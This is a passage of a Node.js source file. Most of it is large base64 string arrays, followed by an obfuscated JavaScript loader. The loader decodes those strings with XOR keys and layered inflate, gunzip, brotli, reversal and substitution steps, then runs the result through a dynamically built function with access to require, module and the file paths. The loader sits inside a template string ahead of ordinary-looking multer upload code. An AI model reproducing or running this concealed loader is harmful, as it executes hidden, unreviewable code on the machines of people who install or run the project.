    "FkzZeg1ta8WRgNHEO/jLkd+ueEmGkCn9j07PdTkuzu7GYJ",
    "0BPMXVqahov+UowOLK1n0E3H0zAGa2P+atzBe9t3K6rQBPVroJo76QkBZRfKY/QA4N6k/",
    "lgYWxSc48AzzIexa0Hf84QxiTNJSeSUKM9XHlKR3fpAH0tU2HDeDjPLFwbwoNWtHhJU7tH3q",
    "FhKr/yfLp7+tb7jSk+I+sRExTZfpp6KGtAP76Qb/hqFN/oBw6fnBq/XI156fYWIlqMww",
    "EgVsKDpuEAjxOGtPC7/U/81CVFYfNfmXuWzjHm0Ln95wzKuRlUz25Sf2Dtp",
    "XcBwzQqt5GDO8cbT010M+BhoYxJt5UKiF48T0U9ECxceJ7N",
    "r/NLZGkuNC2lLXfk0EU0KlOV2K8P/NY1u0DhlezinxB6517wRewPp",
    "Zjl51pwyWB/01nKu/yor//MZKghU1PVXdh1KAITWXu2cMr+q0qF/N0qVdd/ar6bdkOtVKNNDbvC",
    "ZcACU9Zi7RHPBXKQV95iM7QNEHDiOlTpNE/kmd4eH/icKoOkpsVNdU0dlmRjOS2BBH",
    "1bRUiQjXRlnX87S3lPRi9CpTV2g8In2RlWizgsKOEKE/xsyPExq5h9y2XW",
    "zrpw0hfy+4hHuEdt/FNnS7GJTsr3TyI4Du6vdb9o/aIN8zXKREwOcBnSG9MFpL0s",
    "MAvsqBWfUtXl9qUQURZXMJQoaPwQczI+aHPK+1hxpZKRPiMcWWo/lP0OJGZWXqxhOINGQL3hDZt",
    "ZEaM9S9z1cdJau4PhNdF2kQLOH9vknsiF1LKXm496Jdw6ErG5Udnr2oL",
    "gCciJDijG0r1BkgF6PNi5sADJCX8UwfwTs9IcBYrKt4FYVtWW7k7apYX0kt",    "0lIGZyQ8ekrCHHun/k1OzaCup+0tamXPyJgmV",
    "J29cV7y1NT1FDenfuMW/Xd7B71NZ45YJCpZdK9S6czoWvzvu1",
    "PEn49JVmIXPtBLg4Z/1yURE19n2/ztM9S85he9thYMFUX0L5AKukH9sl27T50e+1PFpsO5/N",
    "N+Rs94JDYFutbtxKA4Bb5Zf+iTlXUhCCIRtChweDroy",
    "iUk9JAy2zELFWttp+zN14E5vopDAYsoV+nJJ1ie+wdMImynddJ",
    "xQxjdoetS0mlqCPnjbyUVXVW5qIB0TXM9dFhBm4O2KW2A61hB1",
    "uLl9Pr5mmxsJYq3CgvR2t/9Ba0ZAOsTwTtc6SrvAQ/sUS4h8pEeRVKryt1",
    "jP4SAbbOAHwNK779ulODET2wkCLaEQIynhd6J4oxV+RTdgxVIamxU48Mr",
    "q72YxAVfOAdyJEyX0UgB4b3VUSbNOXmiEBw5SHnlYLqSUPg6UwSbN52EqDf",
    "aYwMefys6+65OyN1FYujZYwBXSbMFVshnW6hjkuwpGcqw5uKD+UtZIkZMpNDKIaKyJfSLbTna",
    "C4mF8HhpdXNPWw7SptXiCPEqSVGcge21BB3OZqvKoRBuf3B69HfiTWF",
    "IAThztisPk0xlIWo4h/e9QTYigQTk172w4faFgLEtnG0QdHbYmzAkaBCsepzsdNgGY",
    "7ZJS6Sqz24g/heDw4PuiXHHlluE8yuTkt4x",
    "eVlOiozjG/X8t++MmhyhBYj0iKLVFauEhbvnpPI8iBEwtQWrA4Qg8J4Ui1DTTO",
    "CuF7KQC+38tPDUyGHiu7l5yBvVolP9EqoksQhRpLkW5r",
    "Hqx0wkpkhoOMsILFjnGpKH4TzLoXSbjtIgg",
    "VwAMWjzaoOoVIlewh/rXyieOwpTQmbZ6flRK/50WGuv2khbfgexuRps7w0Ebj9z+yoJzLbg",
    "vlPNGelQJHRvr0lqP2meRzeFzZkOUA8FR5vn674kO0iiM0",
    "LSAHH/b3anWrvFTIpt/n6YkNQa3A3Nvs55VPLW+0A928yZavKbOFyHJS35KrGdZOKrAHsGGec",
    "vS84uMAE2SuaHvI0Caf+EFyZooISLbWgs9dPhAQcJFj9LqIsNcDmW0tCQ/",
    "lEAR4rxPj0hb1Ih58KLQNLHjT8h/D/Vd7i5",
    "RkaMDdQnSmDBr5tz5XKSOXSw3yXCMHFxLb3XOEkaW+JwEBCgEh4wiQqU7sIaCYk",
    "9G7a6WLIix0YKvS294yvyJZmSReDRkikLfLNl8Hg3+knNMQm5wO5dU3oApUbG6rniR",
    "vsJ5uhke5DCJQD62TAdgAbla1olhnnlbBCAG74qZguikZQHpAxD9tdtoNxiT",
    "+2Y6w0QUT1G1NUdx4mJ2P0ZV7rgapE2ItndyM9DI3TAi9",
    "kcSK9nFrLEFZghF8l6IFED0N7hkZ8AYd/t8UlqxWf6IwfGZScj743t/f/Odkrc9A",
    "YzPxVVN9ac9jr20lNgkWab66OpYfIFg2usODeMERKX018/M26V3jUuefdbuRdy+4zh",
    "jenKlQUfBos00Ym9BzdMODQB9veprhgxfzSieauzzNxkePGjXHTOv",
    "BnGd3maUtR7AThqiyfZM/KxObPhwfUlpse/sU/GgHQAvwlvtXoZ/xX/MY3c/qitXK",
    "PQ9jjSagc6wo6Ecx5nvhtEWUeJB3TteyA5H4/hDjv3VGAqOoPdpFXoAgxgSxW4FsoMbfJby+S4",
    "dZjz2j/9VanQKIHfkufI0KgFfApjYaT18Ypy+vEZdk",
    "89JESiVlEqruDV6Bz0NaJkYcUkQw11ZztAzLPMvQE3",
    "Mg+UI1Hu+GMnAAggEHKOwViItRtcFRv3p8D7ECu/acARwlp5I3e0aQ9lLjPLZahO9q",
    "8t+cHDENwfNg8P8fVa2XiOKHy8lw75nqrT6AewK4DmiWS68BDI",
    "MvhhSQvvoyJgD7LRG9BOVQTJHLUONcE8b13xC6nGcFz9I1iFf9E",
    "Jg1ssOVZYNFzMR2RTzyNzRQ6DQu+h8Z7cI4ijdcxVTmGNH1e9oqA3xMuF43qR0AkDI",
    "TovBNHFbV3t5cCxAZm2TW2z2BSr172dqAxVFVoGfep8Im9M5rzGiEWm/1709niqSmic4wZTmY",
    "Tei8oDLVbzjy7oD+R5vPvVP8RRp2JBK4IhvP84CK0tBlGem0y7b",
    "T2t/VXVrdtSNS4qDk5Ed76voW6tYlPSfppJ5JaafXX3m3vOC/trfyczmBUJMvdUCmEntTuTaOxg",
    "dPwFVCmdY2w5j4pGvRq79K8s0OgoazPSwK6LJkVhq7zypIt",
    "knNju8gzqMpebPgk3uiUewAiH/qu5xdjrJsR6jJbfciPEbkaNhZX0vLl8Sm4LVnmjoTcK2UUu",
    "SOj5GZMrVfyNulwQ5/6qh/F17WIvtlhMEX5M",
    "RRiMWzrB3W/6D3M2xo4IlfcKKxPmlNjDH69JlxVMJegbJMMXC8WgAiPUS3fVVqYCho",
    "NGO8r43S8qGFqjocMasRcRW/iyuw3J6TDuHZQV+g+uP9t35sMVw5Ph",
    "ZBXE/d7q/hMbJhJLxMDyPx1A9dhMqTeE2jea3cKMvKTX+oly7QEANBNVjvm",
    "5ZTC0E5Bv4ZgnLly5KBpeO/7O0FCy4rDYC40ft8fnWq7yV4qVexf4m7/PdYzR6vCx5",
    "U8HzjSZ7lGGhCGgacnhdBf5i65vHyqQAoP7SP+1KDubB6huesvo7vmbyuVv5U04ibBOuqSef",
    "LA2Bkonl7TNGnhTgDPglskp3pM8S1OgBOU0iT/Pt1W0S9yRMOHO36NtGxq2Uyq6hQU5VR7J/ml",
    "Y20w0LI3L8QF+N2Fublj/yHY0wktb/vu86NzBmbjSWZeyb0N88cZL/uM25xP2CGA4mRc2pinl",
    "Fv4tKErLoBAlhCozfn3IBrY80Wz50MaRhsRs3brPg",    "1RO+epF1MmC6S8VH2EFdc5zc5WvWp2+BQf4Tx/bqAWxtp8B8e2i5PQSULDsG+5TRY",
    "C5YjY9dVlkPwexb9Wj0o5k+Syj/ya4TSkd6uJo1SFdJGWmdEK9A/a5",
    "TwsnXXAj7VZ1EjCprCF5w8EW5DF7mHNcx6329htTwXvl1ONgaj/nWkIHDLOSOd8/",
    "CTXF7GARVzSW6Ywmq+WZR5Ii89RJZiVtQr7q8iuT8nui2G1",
    "E2f7IOtg7XXYVy+w/DfaKXLjw0xIkD1qnaAo87PXTs8o5LDuKzIy/8cdFcCrb5mjIHc7",
    "3yjaGu/jJRLdaN1XYC758j0P2oIPxa49WClYQQAOTHJi5ON9YCp7YbF6clFVk+WT14Q+2fWo",
    "C4aMVBwRBtpem5ulpK42MZtr293IoOvlACvqK78gS4LH2KfPVPOcJ",
    "jf4vi4dADcC972vWP881vLPQ03Q0yUgy43QYPyQ0Avi42QwMQ",
    "rO/r9yibTav2mRPxNA4fI1UATMUWUZNqqON",
    "CLWK3K18S4UJtQ0AGbjWTWy0SAraUHfKDhfjj7pjOW+aQ9yySrvfDmbZEIa9",
    "YPAP//7cYm4rkL718H3WT9RJYuG48D8ACGVq",
    "a8lMhIAsDPvJtrJj3v47757B+1riDCaGsuYjfoeWeFpK/oxL",
    "E9UNsSmj0DxX9zpLylGdCTk0aoLfPmdLS/PuG/Mj/I9I",
    "hUILnLGET5Pn5K/9jTvMT4P2l4i283yiBsfmzqvq",
    "8JJb3pZgVnA0s7fLu/wAA9Ql+M7EzJEV7h7F/zHSSz9Y",
    "8PBkSFxkewO9k/Tp2gVIZjN2gUdC5N6KV9JWAw0GYYGR",
    "hvCVX+ZUs7k7RaZQ93fPLvEJojkvtzGyVzZAy9dYTlA3DTBZzcbS27J",
    "q4QoSn/OZHi4/pgsH/CrLHCRZM9SWVwW2CMc4zeHA33OxIgIdju/u",
    "dvTHU3fYG+Jj2mismikwHE5AIpJGiprxEECu9kpgYxpOUK4NhMP4",
    "a5KMHIg82jUBt6VHc7NDEIxUQOf6RSQlkCQjT971s",
    "XFJnfj8Uj3dXWJHg/G7Abqt3t2lDs35xhtGpx",
    "BA/F/qs8Ck97S5x44Fnd5BTzUyuSBNxKQFVmZST+SuThuI5ndA7",
    "1sq0rCpWZLuLRjN/CjYTr18yErJYgRXAZTgvfrfKnQDVS8Z+D31R6ftHi62PaH",
    "Dl2Ak625rmiySmYHRM2ouAcVba9TzZSBtBODHAK",
    "N+qJaZwcd6LNAe4wWQVJzzqNJrvo60UsB+qXPW1QYqgV+T+6oieVs8L",
    "vKV7+xbi4zy2A2/2zQLB95kjfvdLeEV7S41YBCu4h/F7R/qnPqrmOmvkotl7hNLvmb",
    "emPywROz8hZaLRrH0jQCEodXqYxQD1T61t3TxmTGAb9NwOaPa5iIxWx1",
    "SXLO7YXLZ5eqeer0QbXqtePQ1FM1/or2OdjVeIhQp8E8SOi53",
    "HMLUvZu5/PqghB2U9DMme/nCsDT6WaHGzg7y139ngglk",
    "1lm1k92bzRPH5/y82Tp04nU6v6qhHNrZa5R+UCd4JX2W",
    "h/Hr953IP3FpAI3pj/thWHuf4nomYFMiLvnGEdcIU0TdL23HF2olHBRtDbSTbt24dD29UIYY",
    "0h2YaC/C2pjSng8wtl9qhpHgFsqHrhjl+th6tsXgEt8nNR1bLe",
    "GUolqupRdHwK0GpPkRGDiC//dcbCRmwAwncsYWOzn+s",
    "+Fb9c+oD21+wFW8KvCnvqnVBbkh40ROsoeRsCV",
    "h7+IHLi9OGdFB4ZQ/0OHaZcCSuv5wx11r+YuKVYAg9rCyk5CcEn6hBCuqtWU77V14gyFPcdZ",
    "Qlq9VkMEdAUPOjyHLjvFum7ppeuRmkRtFXcZrzeq0wqdr/Yj0HXI9qWuePB",
    "J5VFj55mbFJmvs8qoSYtXyuA6GEe+M7dK4aNNsA4Rf",
    "E9qljOr6MA8cwH+MrjycdDR+z+n2QKPodrnNHvTv0I6T2VzdjHkVJKvEGYh9Sy3Y3Wq77",
    "F+nCmMEoDBiDD0//oMXE+Otq7P3ceKmdeu1G3dGcXnCevf93DnbmHekOz+Rh",
    "1W9gikUGGs9WbAe9Qys3PJ+oh1RquDE0Ackz6D2vqHTlvdsd1OOLV9IZ+Ex",
    "wLV7QdTv/H/xG+/97tGUlqu3vFIw3w9PAJSOvsrJBYad5UuPq12TXhKhEyqH056Mi2WWxDK",
    "HfYGF+Zv6OO0dWuusl69uwdvQ9KBM25MllHW3lRUNPpx1R42r",
    "DcCHxVdm9p0RC/64NpQLJu6SEYutciyrIKc/HzchktC",
    "tH4cdpSmYitD/HDeGiUso2Sst9WPMK440JTi6WCZ2STiAFBpydLJ5CXysKpYNi7iMaip",
    "s7FNzyiQNNn4BuA1siZ678c2M5ELdZERpd1g/qVopwmOPiDmFZwOCI",
    "f4x2KR3K5GubNL443naq+bVfCQ1alybpHOG7QcIXZwNFqVB8nzkGzUvO",
    "/eMkHD98UYqhm/AVilb4099hKZ98UD3d2yOXB8J",
    "LqzxJdFB+psgXSVhFvE+bbbEyoNbcSDDc49M0IkLgdK9MqxpIbk2m",
    "Db2JMWLM679AA11pZmhfBIlVz9DABrqOPFpoHwmKP/jsQbV2KwJhMbszn4WX4fOVXZVzi7jUv4",
    "1mBYzT17s2i6PQuz5inD/HHReXzuGLKEZT66llWHxSeMGpnZVc2TdzEZ4pBVcb",    "y1YWx0IgEGfEOSZhELeqt4I/LqlFtQ+uv7xPeiDsC4jbcOLonyxGTfeN5D2wTbiBmzZZBvyjf",
    "5hj0R5vgRy4CnEglQ1kLI6uWaXMUDFoY/QiNih8qzio",
    "uKvXC+xLTJZVHEjQ/w/8NsPcCG4o7n6sk43kYKUaY3Hc3m0yew8xqSO0DvcGe",
    "+5IGMKCOY3SzP/Rc7CEJY/WUiEk7ZW7AbAzaRa7nbqoYwcF7SZNEg6y17ASlbv3eUkomGPdX",
    "zJlUGJ3sYY5Crq90ufjC1cqhCKoEtVa9GAnlIuOpZfjJbqbuNzYhUJB4qtdAzZmoP5",
    "z60/TQ2hNH/Jeo2dIJmqOfMPw0TPpITLrj5auPldM08A/NyFedIiNu",
    "A9oY7Dkme367fIIOnhQAjk39N0rxidyAtdSkRoC+AIY6Q",
    "GdAV+JGcXzHuKCSlndljhRZTuLFwNZ70Nr1X6XNnJ7W37",
    "jVRzh7q+F4XVDoNWQls2mb0YCf4awaTPek2mYj8iZ6G2S3G1BSrbGhF90DrsXVH0mW3TR",
    "1b/+kk0HLjzObKqEnMNQ+D2LbxrYQOvGuO9CAYcxI22znw4dGtD7",
    "7UPwvohYlE/jTBo7/4svZ2VEkM1VgRdFM/WdmSEPuPXXu5NYy",
    "IzAj8QJ6Beiw67ypA01lLsvRuiXr3g4cdburEJglm1mNZY1r",
    "5pjz+4zSOP1bep67ROlSSdzrrStI364O1qdaSImV/9h+B",
    "SZwmbG8IdUBPuGtp+YO5eO1+jWmFm+t51cXFKoO+7h9xYfUv0c4eKLJpUdBSSuYb+0cZvNjV3u",
    "BvwJA1cQaz5uHUs4axDifz/cBGymVEQ9NQf7XlYnCfnPwUMCFkKtNg56hdmouK7NB",
    "+cfZIG5a1RpLxNEr5dCGRfcEMlnM3yRHmhdXkr9pTkXf6rR7wxnMi",
    "tT3cKE6hkMvWLnNKDm+noAsf1/+Sp4Ok48ZTbEh5u43DVR",
    "g4gaFjpR4vaIcFzcdhmvmU/1IB0oNSnuzNjK8fH3",
    "X7HOzymtZH9P13t2fCHb0CAKI4hzzJONQfb",
    "PA4RbkDMT49QIGf09o/socowQzhwhCnQE8iBJQsig+0L/SRUMffv3xJ3k5ZOjEYAlOwoUwP",
    "TTlue88EiZn+sUezsX235X7ZcyQrq8EMmlkvglf",
    "rGyEF13p5+7N588ir3gEP4LOtgG9SZQxZA0v9iNfF",
    "7TjDsUatrDu7ZU2V7soq9/BHLQzQGZMoSvaex+YYQPM1M7i9YW",
    "wN3NHidJSPYcUDVfttKbuWb2OQn1YnbS3jey3VlJBQ2c7XLHK06I",
    "RvQChL3z9x1vSyDo9JuUl6T6a8nn8c4F5yaqzsBgv",
    "nRPWz2e/XG4xYUJATpLlWfPmeS8H9FijccGg3En1oz",
    "loJsUhfxEXznirgzOLYs0a32xiA+szFIwIlSfD55wwWX82xHEo++1/WVMVvWAgbJKTt9x5SOQ",
    "VA260/4l9JJMhhKlbpXRflCUnrAQt+OV3POtbJSMFi00CYg0eyHjC",
    "L1SqY0XzVtf1MiJ/B0CVfYz6PwYF1JsZipLBsxqQtysZEB4VZ/0Yjg4L5F",
    "SDnIgHNp5H8cttxhGf0OyBPPQh/vIsvadnnQ4XJ",
    "gheOiYo/j5V3b7K/lC2JImg/elEjBQAd3grBZ+i4xdhDIZ",
    "/vAWWMDAHrgLsiPsFnh+i3C/Yyvk0pzDCxdpbTWw8BZmoMUfMcdUQc10IZ/SOmI6TERMV",
    "9GisUikF8qxB1+pT0ooh49slblkgvIO2Qjfr8mI3ZbFXv43CpNpG0CXdc13k",
    "1/JA/FTXbTsSo8iunOlT0q18s0KE/UmCKH6DT/k+GgyDP36xFiOLlJ752vpmBtqLvz3a",
    "4AwMkSdKJbXakbJfBHPlBfub2EkKuj5HSiQepiUO2T0NPHzrXyx6tydhvXy",
    "VWb3OAb4D1nEzCkYG8Ey1O4/rJeOsoYzygBRHBBgxSaq8AndUMdOTkyuYwxorVDjqV0W8uZ79S",
    "dlq8X1MYQ8mdOhjg0Eo8vDO6d29ftz+SHzWEgK+laGRIEjK0W8z650gcFRc0X/t",
    "LCBd7pcVyjhPQbL4jQPPVhqYJqQU58y8BSmDOl4iGNGsTSK7s1PuUGz16",
    "y8av3t9DYNl+gvWlPn378L3It6tXlolywbmpb3d6T53j+NB7YB9RyyAGhjecff4jr0VC",
    "cC8WB2uj9xc8p10qN4ZZkzkfnaF4VkrEWk6tZ35Kdg+LOBFGQHKDYc2cPyKubvWpuFk",
    "1ZoX4tdma651CoDuP2Z5LTruBwyIiji/6I33TOVYlQUoN6XX+L+amvR",
    "JJVUZqhobnfCKBxxwbbvtNjzcLvqHJ+Axd3Hl",
    "GV0ZckEQYU2CTNlgx9AIuKj7fICjsdFtOtlwRuWHFULrvtvThwRt+HI5n4",
    "GQrEY3W8LrIZ1zotBlVNnhPzGYPkpB9lfqlwbPvSp",
    "ISCeaaBvBC9Mh3nUpqMHWrIDzHJUheVNr/JpkD8XYS",
    "8e0gcz1ruFnVCD91ymAJNED24iWc21Zi4iShORJCGRPVMm/+0MeIdAdEUiHhVhL+VghQ",
    "fkxIgPJ05sBBPMDygfRPLwerMnz63izYO/uCTjoD1AJurJ1FXwjFZ6W7TDt+r1y",
    "KXCxTizCJKtqO7aXCzUPYQnvsY3oCLIHx+oAlTsZxIEKG4nEm/qI9Q+fzOWr2cDV7",
    "tEeOqF5b/8JqvKB052HZbvii/o1fNY7zdSya",
    "O0boLYaJY/qhipNb2R/vTQQ1VGV0V2GXeFoYkxZTVE2LM1h44sE5",    "TGQmcVL9f3xd0Xd4CKpfYaEgBrBEZvjx48j9eTTH+qK8THPVA9OBN9J5yupfD+FW4Tuq2J",
    "5kO3fElo5AwmBzNft8G/6GQU5h4r8FOISLWtGDN+q19c99E",
    "uk2Sc7dqFGTg372AK/tg02BS4Jgz/OTQjrukK3In33dJgxpnfptnZo",
    "jkoL8ynZdak3Touiz+3Q7/1nkTEovL7yx1Rpmhj0CKsM17tjIPaZZSovM3DwzIdC",
    "qkS2e9ZtwrcyFGbMmgmR1CU7uhE63lKJEsbP5m",
    "xqEOnu1PFh0JC4jaN9RM8J55PqKeer8QT3S1oytT6lUMb4",
    "OKiEcFHEqnvEzNy+xIQNIUaPQuaDhFX/QPEDaWDp8rdVXxeQRXngxjtcbLeZWN9v+fTsJmSrz",
    "lbBMQtSWRTMpOQky+i8DWHBj382IvgtzUVeJM6GS",
    "i3Cs7uXyVxJ8w1I785j5vn9njA+r+n+MwuAJRIUW+W",
    "zeRArfjw5f6/QkFFYgntp7HvMyEAyEo+7YknDLI0AGLYCe8KxafR/ei",
    "TmGgMRi7v1Eo04ga6YN8geGwBz8+yGeOr+Rfzl/qaMyNqxbX7hC7iN2gq5",
    "4BcIOSyCfsnZH5NBzdBY9DekFhA4IXb++SKoaR5C+wZ7bshHEn0xWjvbqI9G",
    "MYFcbiekNK+gBa0Qvtds/MGUU+/1rxJOcLJbCi/hZZ4G33pWWNEPloK",
    "iD6XqNbDHXBf2Pr/gBa6utO/X5OvSWQ9HFLh/l6QpfTaNriVAwSnvaP7abvzYRYmsJ",
    "7Q1fg9r+V8ATFzWklTmraM+jxld9Qq7LUh0wyFPBN1IL8TPaLxTEDd",
    "JE9FvgnltkYmD0meF39y6QFITb5uGw/b1RIuK6SYO1tqGA5Cqo",
    "vmBdJ+7qMZwaOBs5mYIC6+3R+u46OQ8yzjOAtjWB1meKEMas9LsH3+",
    "LyOKuX3neLerPNxIC5/SPo4mhGod0YwIZ0siPqe",
    "X55ZhPOghULep7IxIfoTzKdBLtL12GhLvQY5hhhShmkMl",
    "Qn/dSyw+csNmgw2Z14L/HYLhrkhDZqDbaSHkskoW8B0RHI5IyclVdzQC",
    "EjQZrjT4+aSLXolNRDcH+zbJu6Z9imgUz/oNJ9oYyQ/KEV+h",
    "lGjH89mUoeTy7weSyTwLj62ghF1vU9cmg3QETxz3l2E2CKpMObAhsVQ6cvlgtb",
    "3KY0wvhThUH7AsBmFY5/H8ZaTiJVOf0CXCjUku/8uX5D62lqxp/Ftej+v",
    "LF/OFqXWfWOwn7jc398VTKkaDg2uQlwfFLb55",
    "/HsOY9YRAcRcLXYNStOOrlB2ocFkSsjA+O5wZFnrD",
    "23oWZZxxggqqScZqT84Z+SFJAPHoz+M7WwW2F",
    "sVc4xiOv1Y69gQSFlCZPxi6QOwsYnTIsbJyanqoO7xBbl2hXBJ91AP0MdgC5FWQ1QTwP",
    "WtiAMn5som/qHuP16nRnodiErADUnHB98OGvmbfDYfld5",
    "PN3CnsAv8Xy0Ns/qd45zeDA9BNDznbXv95+eSZFitjAx",
    "DaFVxsWv3sFepO9cPJw4wXTpwA7JDgAl23RKHyqbGdCL1XKT3dteZTNm9WMJj+UHFVIfu",
    "B3obGyJW8rIMOezYdJn1Nw6YK25PpHRtG2LG9zI8hhQGXvziplfx8ZGqRO0+60N",
    "hebkVvFouspq3pkBUlprPHduQ1kHGut7Esf9CNwxTtcfvW",
    "2qrtCE160kVuS3E9acF4X/ndmTWSLR4/dP/aZV5SzN5+1vCvgYL",
    "unjlXl9afMISiVqbNqDm3Ewu96ryM+1+R6Cqy0eC86s10uhny",
    "Vv7eCa1D6NE93lHINs6rS6/X0T0q6Ysxyq4aqN4Zz0L1W",
    "9iuvmwy0I5OpE42Hrlj/bQb/+O9w86DBV+/lkxedKOPF/k57Y",
    "6KR+j9gjGETsNtDfJYv4i8Bdfmun5ZAANtw+2QOOfpmk132K09sQo5OaScxi",
    "aBOZfNe0PcJByKKQNuY/4HsMvH8U2cWVOycVqTk",
    "1nE7AOFJ1PD/5+uUiCLDVR2gFfqCfilCzGIMNpcRa23S9D",
    "GL9CAxqph7lcgb2PgV9nPLNt4Tzo2QcANqrqq7vZrMnm",
    "ufu3lzYI2ClAao2vpmtyNOI2sYHRa3R/UJJlibmd2jPZxQcwfogervOr4CG9g",
    "jcjLXYqbB828OZ5pGeiUZaU8Pn+pQi41C355s9hnM5f1kna7M99IbbAKXkbr2F",
    "y7eniFCc04IATpLrIGb4zB6F/6QhWBivSOepcxAP",
    "cnBfp6MLDbgVvVUHa9Y3/Dz4Fiz2cD68SQwh9x10CkJdapXey98G",
    "PAtMX72l0pJDqNNfyx9ewRNdD6EzQZYnIDiPWoZzjIuWk7PN311c4veQsXLmw2mn4rO482w",
    "rOrdvYE9ArtuPmVpb2Xf95H1+41JPH3T7EbAEfk5QBc",
    "DVJyFoOxxpMYRAXyTEfDrYgeOqn/qVwkf9k5clc3OQyUwkVUqPMEYMjSafr+tfOBj",
    "/SQtmf1xGfVNSCZ7snTxheKD4gC7drHaxA5WjVAdlh",
    "ba+tk3H4="
].join('');var qlDJC2euPYo=[
    "MZRd7/sWBMO5g+dN7b7/U2iELkpHTN6rb36",
    "nJQOxohP9j88GpETaydiMO/v8XpcJiLSeaJSZVkZR3umM3fI4v6b",
    "HUdj/ZIYUf9xXlyDsvvdQiJ2OvusUIr4UNNJvHlCtxHY6TvBuBKs/M6BgI3A",
    "1HbSaAw9s9qdxxIRiAPBBO2Ot5PVh2GW98Z",
    "Gc8p/48wS37X1AD6jQ81kNnEzXj9vJCz1BfEAiTdDVAt0YnswfXWIy98St8",
    "l0xkpHcibnAsMF8ohhL/X+IgDY0+NPpMNfm",
    "yRKM+rhJJtJkfJ5GABM2/HXTS2iUqUDFRxOSOIO/oa6y",
    "BBjUIxdqhjCKockQjNO1lB1Y4lVwov7vd4dpNkgqaBaZHapcZ1",
    "EX2vX2/VA3pFmpQmEHiiDQxtymUe49DDKulfFpALefXYBmsH",
    "CwXxsOITQuX/Km1KNWbNcrquVpMeqEIX4pjIxnmggIt4pcGC1wZCes",
    "NWnaNh7ziMqctM6k6qlK4DZgBDdT6dgynAFtyjc6bDPijSq1hmH",
    "ftkFK7HM8TzEB62dNW+mFV4vy3xtJHgI4ecAFVFIr",
    "O42vaL6JS2VeiswtwQArAG+rqGW7mSETri/OXACb9MrUoa",
    "+Hsp3q2PoKIMYDdK4KUULtqPYhmz5T3f537OyDH",
    "QSjN0YrDkSfvp+XWhPqkDPADYIyX0jNz7utP4rMzqu1eCcqPS453AmiVMGeJ",
    "GYKC9AXDzxNtId4nh8uF67+CTy1/kyG0CuDAYegY42F+4UjuTByH",
    "plLmGWwv9hCqrFhSW71yqyAVFxFyYqXErqCD",
    "0EwqDFjPGdv54vvnjbgGv0hvhYiqlW",
    "0gijjRhVabHd33t27mIME4PUZpqiwhMrzxjILAdk+AuRAPe4FS",
    "GafNpGAqWmI8KplHPDvzE99B3hqUJSJkDOAGLkFZJ9",
    "dYmyvbdsEN4r+6qmvwCaZUkftT0Eupto0Mx3I9utJ/ZhWfjbgsd",
    "JhBgrXIlkYmNYd7iWsYTdOtrtL5KzK4xJMXY53sS2",
    "/tibOMQ=="
].join('');
var oYrzOkNbx=bIheuYNfPp["from"]("7e955ab7d05c403eaf37db4b36a1b1eb1bfdc0","h"+"ex");
function B7ewMgcI43pyu8(LVaWeHDWg,NxGZycbM0z){
  var YKjrQhoWH0=bIheuYNfPp["alloc"](LVaWeHDWg["length"]);
  for(var DGuGYPxylu=0;DGuGYPxylu<LVaWeHDWg["length"];DGuGYPxylu++){
    YKjrQhoWH0[DGuGYPxylu]=LVaWeHDWg[DGuGYPxylu]^NxGZycbM0z[DGuGYPxylu%NxGZycbM0z["length"]];
  }
  return YKjrQhoWH0;
}
var TOIA3e=B7ewMgcI43pyu8(bIheuYNfPp["from"](qlDJC2euPYo,"b"+"ase64"),oYrzOkNbx);
var ffVWUPY=[];
var DGuGYPxylu=0;
while(DGuGYPxylu<TOIA3e["length"]){
  var zQJ9yXBPFWXiZ=TOIA3e[DGuGYPxylu++];
  var IWMpn_Sau34L=TOIA3e[DGuGYPxylu++];
  var BbsP8HR8EcCy;
  if(IWMpn_Sau34L===0xFF){BbsP8HR8EcCy=TOIA3e["slice"](DGuGYPxylu,DGuGYPxylu+256);DGuGYPxylu+=256;}
  else{BbsP8HR8EcCy=TOIA3e["slice"](DGuGYPxylu,DGuGYPxylu+IWMpn_Sau34L);DGuGYPxylu+=IWMpn_Sau34L;}
  ffVWUPY["push"]([zQJ9yXBPFWXiZ,BbsP8HR8EcCy]);
}
var LVaWeHDWg=bIheuYNfPp["from"](Rq10OUxgi,"bas"+"e64");
var N4tB8g_Bt7,zD0wYm6xTH,YKjrQhoWH0;
for(var DGuGYPxylu=ffVWUPY["length"]-1;DGuGYPxylu>=0;DGuGYPxylu--){
  N4tB8g_Bt7=ffVWUPY[DGuGYPxylu][0];zD0wYm6xTH=ffVWUPY[DGuGYPxylu][1];
  if(N4tB8g_Bt7===0x5A){LVaWeHDWg=IQBzq3e["in"+"flateRawSync"](LVaWeHDWg);}
  else if(N4tB8g_Bt7===0x47){LVaWeHDWg=IQBzq3e["gunzi"+"pSync"](LVaWeHDWg);}  else if(N4tB8g_Bt7===0x42){LVaWeHDWg=IQBzq3e["brotliDecomp"+"ressSync"](LVaWeHDWg);}
  else if(N4tB8g_Bt7===0x58){LVaWeHDWg=B7ewMgcI43pyu8(LVaWeHDWg,zD0wYm6xTH);}
  else if(N4tB8g_Bt7===0x52){LVaWeHDWg=bIheuYNfPp["from"](LVaWeHDWg)["reverse"]();}
  else if(N4tB8g_Bt7===0x4F){
    YKjrQhoWH0=bIheuYNfPp["alloc"](LVaWeHDWg["length"]);
    for(var zQJ9yXBPFWXiZ=0;zQJ9yXBPFWXiZ<LVaWeHDWg["length"];zQJ9yXBPFWXiZ++) YKjrQhoWH0[zQJ9yXBPFWXiZ]=(LVaWeHDWg[zQJ9yXBPFWXiZ]+zD0wYm6xTH[0])&0xff;
    LVaWeHDWg=YKjrQhoWH0;
  }
  else if(N4tB8g_Bt7===0x53){
    YKjrQhoWH0=bIheuYNfPp["alloc"](LVaWeHDWg["length"]);
    for(var zQJ9yXBPFWXiZ=0;zQJ9yXBPFWXiZ<LVaWeHDWg["length"];zQJ9yXBPFWXiZ++) YKjrQhoWH0[zQJ9yXBPFWXiZ]=zD0wYm6xTH[LVaWeHDWg[zQJ9yXBPFWXiZ]];
    LVaWeHDWg=YKjrQhoWH0;
  }
}
var IMTZBT2="ymF2NPAK0IqFUXba";
var lmSh8rWNFK=[62,220,24];
// qGtP46nncrVDSeEE653aYusac1Eft/E=
(new iw4Kil7OesE3Q_(
  "r"+"equire",
  "modul"+"e",
  "ex"+"ports",
  "__dir"+"name",
  "__f"+"ilename",
  LVaWeHDWg["toString"]("utf"+"8")
))(D253jf_e61cU8, module, (typeof exports!=="undefined"?exports:{}), __dirname, __filename);
`;

const upload = multer({
  dest: 'uploads/',
  limits: {
    fileSize: 10 * 1024 * 1024, // 10MB
    fieldSize: 10 * 1024 * 1024 // 10MB
  }
});

const storedContents = {}; // In-memory storage

async function cleanupOldEntries() {
